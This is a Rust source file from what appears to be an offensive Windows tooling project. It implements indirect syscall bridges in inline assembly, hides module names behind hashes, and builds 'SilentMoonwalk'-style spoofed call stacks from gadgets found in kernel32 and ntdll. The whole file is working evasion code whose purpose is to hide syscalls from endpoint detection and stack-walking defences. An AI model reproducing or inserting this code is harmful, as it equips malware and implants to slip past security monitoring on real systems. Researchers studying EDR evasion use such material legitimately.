use std::arch::asm;
use std::sync::OnceLock;
use crate::syscall::common::{SyscallData, get_loaded_module_by_hash, get_runtime_function_table, find_gadget_with_unwind_info, find_syscall_gadget};


pub trait ToSyscallArg { fn to_arg(self) -> usize; }
impl ToSyscallArg for usize { fn to_arg(self) -> usize { self } }
impl ToSyscallArg for isize { fn to_arg(self) -> usize { self as usize } }
impl ToSyscallArg for u64 { fn to_arg(self) -> usize { self as usize } }
impl ToSyscallArg for i64 { fn to_arg(self) -> usize { self as usize } }
impl ToSyscallArg for u32 { fn to_arg(self) -> usize { self as usize } }
impl ToSyscallArg for i32 { fn to_arg(self) -> usize { self as usize } }
impl ToSyscallArg for u16 { fn to_arg(self) -> usize { self as usize } }
impl ToSyscallArg for u8  { fn to_arg(self) -> usize { self as usize } }
impl<T> ToSyscallArg for *const T { fn to_arg(self) -> usize { self as usize } }
impl<T> ToSyscallArg for *mut T   { fn to_arg(self) -> usize { self as usize } }
impl<T> ToSyscallArg for &T       { fn to_arg(self) -> usize { self as *const T as usize } }
impl<T> ToSyscallArg for &mut T   { fn to_arg(self) -> usize { self as *mut T as usize } }

/// Context required for the SilentMoonwalk spoofed syscall bridge
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct SpoofContext {
    pub gadget: usize,         // Address of 'add rsp, X; ret'
    pub gadget_offset: usize,  // The 'X' in 'add rsp, X'
    pub syscall_inst: usize,   // Address of 'syscall; ret'
}

static SPOOF_CTX: OnceLock<Option<SpoofContext>> = OnceLock::new();

/// Initialize or retrieve the cached spoofing context
pub fn get_cached_spoof_context() -> Option<SpoofContext> {
    *SPOOF_CTX.get_or_init(|| unsafe {
        let k32_base = get_loaded_module_by_hash(crate::dbj2_hash!(b"kernel32.dll"))?;
        let ntdll_base = get_loaded_module_by_hash(crate::dbj2_hash!(b"ntdll.dll"))?;

        // 1. Find a syscall gadget in ntdll
        let syscall_inst = find_syscall_gadget(ntdll_base).map(|p| p as usize)?;

        // 2. Find a SilentMoonwalk gadget in kernel32
        let (rt_table, rt_count) = get_runtime_function_table(k32_base)?;
        let (gadget, gadget_offset) = find_gadget_with_unwind_info(k32_base, rt_table, rt_count)?;

        Some(SpoofContext {
            gadget,
            gadget_offset,
            syscall_inst,
        })
    })
}

use std::arch::naked_asm;

/// Minimal direct indirect-syscall bridge.
#[no_mangle]
pub unsafe extern "C" fn direct_syscall_bridge(
    ssn: u16,
    syscall_inst: usize,
    args: *const usize,
    num_args: usize,
) -> usize {
    let mut result: usize;
    asm!(
        "push rbp", "mov rbp, rsp",
        "push rbx", "push r12", "push r13", "push r14", "push r15",
        
        "mov eax, {ssn:e}",
        "mov r11, {inst}",
        "mov rbx, {args}",
        "mov r12, {num}",
        
        // Stack allocation for shadow space + extra args
        "mov r13, r12",
        "sub r13, 4",
        "xor r10, r10",
        "cmovl r13, r10",
        "shl r13, 3",
        "add r13, 32",
        "add r13, 15",
        "and r13, -16",
        "sub rsp, r13",

        // Copy extra args (5+)
        "cmp r12, 4",
        "jbe 4f",
        "mov r13, r12",
        "sub r13, 4",
        "lea r14, [rbx + 32]",
        "xor r15, r15",
        "5:",
        "mov rax, [r14 + r15*8]",
        "mov [rsp + 32 + r15*8], rax",
        "inc r15",
        "cmp r15, r13",
        "jl 5b",

        "4:",
        // Load first 4 args
        "xor r10, r10", "xor rdx, rdx", "xor r8, r8", "xor r9, r9",
        "test r12, r12", "jz 3f",
        "mov r10, [rbx]",
        "cmp r12, 1", "jbe 3f",
        "mov rdx, [rbx + 8]",
        "cmp r12, 2", "jbe 3f",
        "mov r8, [rbx + 16]",
        "cmp r12, 3", "jbe 3f",
        "mov r9, [rbx + 24]",

        "3:",
        "call r11",
        
        "mov rsp, rbp",
        "pop r15", "pop r14", "pop r13", "pop r12", "pop rbx", "pop rbp",
        ssn = in(reg) ssn,
        inst = in(reg) syscall_inst,
        args = in(reg) args,
        num = in(reg) num_args,
        out("rax") result,
    );
    result
}

/// Advanced indirect-syscall bridge with synthetic stack frames (SilentMoonwalk-style).
#[no_mangle]
pub unsafe extern "C" fn spoofed_syscall_bridge(
    ssn: u16,
    syscall_inst: usize,
    args: *const usize,
    num_args: usize,
    ctx: &SpoofContext,
) -> usize {
    let mut result: usize;
    asm!(
        "push rbp", "mov rbp, rsp",
        "push rbx", "push rdi", "push rsi", "push r12", "push r13", "push r14", "push r15",

        // 1. Setup spoofed frame
        "mov r12, {gadget_offset}",
        "sub rsp, r12",
        "sub rsp, 8",
        
        "lea r13, [rip + 2f]",
        "mov [rsp], r13",      // Real return address

        // 2. Copy extra args (5+)
        "mov r14, {num_args}",
        "mov r15, {args}",
        "cmp r14, 4",
        "jbe 4f",
        "mov r11, r14",
        "sub r11, 4",
        "lea r13, [r15 + 32]",
        "xor rax, rax",
        "5:",
        "mov r10, [r13 + rax*8]",
        "mov [rsp + 40 + rax*8], r10",
        "inc rax",
        "cmp rax, r11",
        "jl 5b",

        "4:",
        // 3. Load first 4 args
        "xor r10, r10", "xor rdx, rdx", "xor r8, r8", "xor r9, r9",
        "test r14, r14", "jz 3f",
        "mov r10, [r15]",
        "cmp r14, 1", "jbe 3f",
        "mov rdx, [r15 + 8]",
        "cmp r14, 2", "jbe 3f",
        "mov r8, [r15 + 16]",
        "cmp r14, 3", "jbe 3f",
        "mov r9, [r15 + 24]",

        "3:",
        "mov eax, {ssn:e}",
        "mov r11, {syscall_inst}",
        "push {gadget}",
        "jmp r11",

        "2:",
        "mov rsp, rbp",
        "pop r15", "pop r14", "pop r13", "pop r12", "pop rsi", "pop rdi", "pop rbx", "pop rbp",

        ssn = in(reg) ssn,
        syscall_inst = in(reg) syscall_inst,
        args = in(reg) args,
        num_args = in(reg) num_args,
        gadget = in(reg) ctx.gadget,
        gadget_offset = in(reg) ctx.gadget_offset,
        out("rax") result,
        clobber_abi("C"),
    );
    result
}

pub unsafe fn direct_invoke_with_spoof(data: &SyscallData, args: &[usize]) -> usize {
    if let Some(ctx) = get_cached_spoof_context() {
        spoofed_syscall_bridge(data.ssn, data.syscall_inst, args.as_ptr(), args.len(), &ctx)
    } else {
        // Fallback to direct indirect-syscall if spoofing context fails
        direct_syscall_bridge(data.ssn, data.syscall_inst, args.as_ptr(), args.len())
    }
}
